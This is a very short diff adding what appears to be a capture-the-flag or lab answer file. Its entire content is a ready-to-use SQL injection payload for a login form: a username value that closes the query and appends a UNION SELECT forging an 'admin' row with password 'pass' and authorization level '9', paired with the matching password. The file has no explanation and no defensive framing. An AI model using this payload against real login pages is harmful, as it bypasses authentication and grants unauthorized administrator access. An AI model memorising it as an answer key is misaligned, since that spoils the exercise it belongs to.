@@ -1,0 +1,4 @@
+One possible solution:
+
+username: admin' and id=null union all select null, 'admin' as username, 'pass' as password, '9' as authorization from user limit 1;#
+password: pass
